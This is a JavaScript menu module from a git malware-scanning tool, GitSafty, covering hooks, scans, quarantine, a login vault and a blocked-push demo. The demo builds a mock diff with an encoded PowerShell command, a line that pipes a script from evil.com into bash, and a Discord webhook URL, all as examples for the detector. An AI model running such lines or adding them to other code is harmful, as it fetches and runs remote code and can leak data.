const readline = require('readline');
const { banner, colors } = require('./reporter');
const { runManualScan, runSweep, scanAndCleanRepo, installHook, uninstallHook } = require('./index');
const { cleanInfectedFiles } = require('./cleaner');
const { setupGitHubAction } = require('./action');
const { scanRemoteRepositoryZeroClone, printRemoteScanReport } = require('./remoteScanner');
const { scanFilesAndDiff } = require('./scanner');
const { printReport, printBlockMessage } = require('./reporter');
const { runVaultCommand } = require('./vaultCli');

/** One-line question on the terminal. */
function ask(question) {
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  return new Promise((resolve) => {
    rl.question(question, (answer) => {
      rl.close();
      resolve(answer.trim());
    });
  });
}

/**
 * Runs an interactive numbered menu in terminal
 */
async function runInteractiveMenu() {
  banner();

  const item = (n, title, desc) =>
    console.log(`  ${colors.green}${String(n).padStart(2)}.${colors.reset} ${colors.bold}${title.padEnd(34)}${colors.reset} ${colors.dim}${desc}${colors.reset}`);
  const section = (title) => console.log(`\n  ${colors.cyan}${title}${colors.reset}`);

  console.log(`\n${colors.bold}What do you want to do?${colors.reset}`);

  section('Protect your code');
  item(1, 'Protect this project', 'Check every push, clone and pull in this project');
  item(2, 'Protect all projects on this PC', 'Same, for every git project on this computer');
  item(3, 'Scan every git pull', 'On by default, also "Already up to date". Turn off/on');
  item(4, 'Remove protection', 'Uninstall GitSafty from this project or this PC');

  section('Scan and clean');
  item(5, 'Scan this project', 'Find malware here and remove it automatically');
  item(6, 'Scan all projects in a folder', 'Malware, hidden backdoors and leaked passwords/keys');
  item(7, 'Scan everything in a folder', 'Also zip/rar files and folders that are not git projects');
  item(8, 'Scan all git repos under a folder', 'Quick malware check, e.g. your whole disk');
  item(9, 'Clean this project', 'Move malware files in this project to quarantine');
  item(10, 'Scan a GitHub repo before cloning', 'Check a GitHub link without downloading it');

  section('Safe GitHub login (stay logged out)');
  item(11, 'Turn on safe GitHub login', 'Touch ID / Windows Hello / password before every push');
  item(12, 'Check safe login status', 'See if your GitHub login is protected');
  item(13, 'Test safe login', 'Try the unlock prompt once');
  item(14, 'Turn off safe login', 'Go back to normal git login');

  section('Help and tools');
  item(15, 'Fix problems', 'Find what is broken and how to fix it');
  item(16, 'Check for updates', 'Install the newest GitSafty');
  item(17, 'Add GitSafty to GitHub Actions', 'Check every push on GitHub too');
  item(18, 'See a demo', 'Show what a blocked push looks like');
  console.log(`\n  ${colors.dim} 0. Exit${colors.reset}\n`);

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  const choice = await new Promise((resolve) => {
    rl.question(`${colors.bold}${colors.yellow}Enter a number (0-18): ${colors.reset}`, (ans) => {
      rl.close();
      resolve(ans.trim());
    });
  });

  switch (choice) {
    case '1': {
      console.log(`\n${colors.cyan}Installing local hooks (push + checkout + pull scan)...${colors.reset}`);
      const res = installHook(process.cwd(), false);
      if (res.success) {
        console.log(`\n${colors.green}${colors.bold}✔ ${res.message}${colors.reset}\n`);
      } else {
        console.error(`\n${colors.red}${colors.bold}✖ ${res.message}${colors.reset}\n`);
      }
      break;
    }

    case '2': {
      console.log(`\n${colors.cyan}Installing GLOBAL hooks (push + clone + pull scan) for all repositories...${colors.reset}`);
      const res = installHook(process.cwd(), true);
      if (res.success) {
        console.log(`\n${colors.green}${colors.bold}✔ ${res.message}${colors.reset}\n`);
        // Pull scan is on by default (unless the user turned it off before).
        const shell = require('./shellIntegration');
        const added = shell.enableByDefault();
        if (added.length) {
          console.log(`${colors.green}✔ Every git pull is scanned${colors.reset} ${colors.dim}(also "Already up to date"). Open a new terminal. Turn off: option 3${colors.reset}\n`);
        }
      } else {
        console.error(`\n${colors.red}${colors.bold}✖ ${res.message}${colors.reset}\n`);
      }
      break;
    }

    case '5': {
      runManualScan();
      break;
    }

    case '10': {
      const askRl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
      });

      const repoUrl = await new Promise((resolve) => {
        askRl.question(`\n${colors.bold}${colors.cyan}? Enter GitHub Repository URL (e.g. https://github.com/owner/repo): ${colors.reset}`, (ans) => {
          askRl.close();
          resolve(ans.trim());
        });
      });

      if (!repoUrl) {
        console.log(`${colors.red}No URL entered. Aborted.${colors.reset}\n`);
        return;
      }

      console.log(`\n${colors.cyan}Starting Zero-Clone In-Memory Security Audit...${colors.reset}`);
      try {
        const result = await scanRemoteRepositoryZeroClone(repoUrl, null, (msg) => {
          console.log(`  ${colors.dim}ℹ ${msg}${colors.reset}`);
        });
        printRemoteScanReport(result);
      } catch (err) {
        console.error(`\n${colors.red}${colors.bold}✖ Scan Failed:${colors.reset} ${err.message}\n`);
      }
      break;
    }

    case '9': {
      console.log(`\n${colors.cyan}Scanning workspace for injected malware scripts to quarantine...${colors.reset}`);
      const { getAllRepoFiles } = require('./utils/git');
      scanAndCleanRepo(getAllRepoFiles(), process.cwd(), { reason: 'clean' });
      const cleanResult = cleanInfectedFiles();
      if (cleanResult.quarantined.length > 0) {
        console.log(`\n${colors.yellow}${colors.bold}⚠ Quarantined ${cleanResult.quarantined.length} malicious file(s):${colors.reset}`);
        for (const q of cleanResult.quarantined) {
          console.log(`   ${colors.red}✖ ${q}${colors.reset}`);
        }
        console.log(`\n${colors.green}${colors.bold}✔ Cleaned from staging area and moved to quarantine folder (.git/git-safty-quarantine/).${colors.reset}\n`);
      } else {
        console.log(`\n${colors.green}${colors.bold}✔ No known malware scripts found in project files.${colors.reset}\n`);
      }
      break;
    }

    case '18': {
      console.log(`\n${colors.cyan}Simulating a malicious push intercept test...${colors.reset}\n`);
      const mockFiles = ['src/app.js', 'temp_auto_push.bat', '.vscode/tasks.json'];
      const mockDiff = `+ powershell.exe -enc SQBFAFgAIAAoAE4AZQB3...
+ curl -fsSL https://evil.com/hook.sh | bash
+ const webhook = "https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";`;

      const result = scanFilesAndDiff(mockFiles, mockDiff);
      printReport(result);
      printBlockMessage();
      console.log(`${colors.green}${colors.bold}✔ Simulation Complete:${colors.reset} In a real git push, GitSafty will immediately exit 1 and reject the push!\n`);
      break;
    }

    case '17': {
      const res = setupGitHubAction();
      if (res.success) {
        console.log(`\n${colors.green}${colors.bold}✔ ${res.message}${colors.reset}\n`);
      } else {
        console.error(`\n${colors.red}${colors.bold}✖ ${res.message}${colors.reset}\n`);
      }
      break;
    }

    case '4': {
      const { isGitRepo } = require('./utils/git');
      let global = !isGitRepo(process.cwd());
      if (!global) {
        const scope = await ask(`\n${colors.bold}${colors.cyan}? Remove hooks from (1) this repository only, or (2) the whole PC (global)? [1/2]: ${colors.reset}`);
        global = scope === '2';
      }
      const res = uninstallHook(process.cwd(), global);
      if (res.success) {
        console.log(`\n${colors.yellow}${colors.bold}✔ ${res.message}${colors.reset}\n`);
      } else {
        console.error(`\n${colors.red}${colors.bold}✖ ${res.message}${colors.reset}\n`);
      }
      break;
    }

    case '16': {
      const pkg = require('../package.json');
      const { checkUpdateManual } = require('./updateNotifier');
      await checkUpdateManual(pkg.version);
      break;
    }

    case '8': {
      const folder = await ask(`\n${colors.bold}${colors.cyan}? Folder to sweep (Enter = ${process.cwd()}): ${colors.reset}`);
      const removeAnswer = await ask(`${colors.bold}${colors.cyan}? Automatically remove CONFIRMED malware? Suspicious items are never touched. (Y/n): ${colors.reset}`);
      const clean = !/^n(o)?$/i.test(removeAnswer);
      runSweep(folder || process.cwd(), { clean });
      break;
    }

    case '11': {
      const mode = await ask(`\n${colors.bold}${colors.cyan}? Protect with this device's security chip (Touch ID / Windows Hello)? (Y = chip, n = passphrase only): ${colors.reset}`);
      await runVaultCommand('setup', { passphrase: /^n(o)?$/i.test(mode) });
      break;
    }

    case '12':
      await runVaultCommand('status');
      break;

    case '13':
      await runVaultCommand('test');
      break;

    case '14': {
      const sure = await ask(`\n${colors.bold}${colors.yellow}? Remove the vault and go back to normal git login? (y/N): ${colors.reset}`);
      if (/^y(es)?$/i.test(sure)) {
        await runVaultCommand('remove');
      } else {
        console.log(`${colors.dim}Vault kept.${colors.reset}\n`);
      }
      break;
    }

    case '15': {
      const { runDoctor, runChecks } = require('./doctor');
      runDoctor();
      const fixable = runChecks().some(c => c.fix && c.level !== 'ok');
      if (fixable) {
        const fixIt = await ask(`${colors.bold}${colors.cyan}? Apply the safe fixes now? (y/N): ${colors.reset}`);
        if (/^y(es)?$/i.test(fixIt)) runDoctor({ fix: true });
      }
      break;
    }

    case '6': {
      const { runAdvancedScan } = require('./advancedScanner');
      const folder = await ask(`\n${colors.bold}${colors.cyan}? Folder that contains your projects (Enter = ${process.cwd()}): ${colors.reset}`);
      const deep = await ask(`${colors.bold}${colors.cyan}? Deep scan incl. node_modules & ignored files? Slower. (y/N): ${colors.reset}`);
      const clean = await ask(`${colors.bold}${colors.cyan}? Automatically remove CONFIRMED malware? Everything else is only reported. (y/N): ${colors.reset}`);
      runAdvancedScan(folder || process.cwd(), {
        deep: /^y(es)?$/i.test(deep),
        clean: /^y(es)?$/i.test(clean)
      });
      break;
    }

    case '3': {
      const shell = require('./shellIntegration');
      const on = shell.shellIntegrationStatus().installed.length > 0;
      const answer = await ask(`\n${colors.bold}${colors.cyan}? Pull scan is ${on ? 'ON' : 'OFF'}. Turn it ${on ? 'off' : 'on'}? (y/N): ${colors.reset}`);
      if (/^y(es)?$/i.test(answer)) {
        if (on) {
          const r = shell.removeShellIntegration({ optOut: true });
          console.log(`\n${colors.yellow}✔ Turned off (${r.files.join(', ')}). Open a new terminal.${colors.reset}\n`);
        } else {
          const r = shell.installShellIntegration();
          console.log(`\n${colors.green}✔ Every git pull is now scanned (${r.files.join(', ')}).${colors.reset} Load it: ${colors.cyan}${shell.reloadHint()}${colors.reset}\n`);
        }
      }
      break;
    }

    case '7': {
      const { runFullScan } = require('./fullScanner');
      const folder = await ask(`\n${colors.bold}${colors.cyan}? Folder to scan completely (Enter = ${process.cwd()}): ${colors.reset}`);
      const clean = await ask(`${colors.bold}${colors.cyan}? Automatically remove CONFIRMED malware? An infected archive is moved to quarantine whole (backup kept). (Y/n): ${colors.reset}`);
      runFullScan(folder || process.cwd(), { clean: !/^n(o)?$/i.test(clean) });
      break;
    }

    case '0':
    default:
      console.log(`\n${colors.dim}Goodbye!${colors.reset}\n`);
      break;
  }
}

module.exports = {
  runInteractiveMenu
};

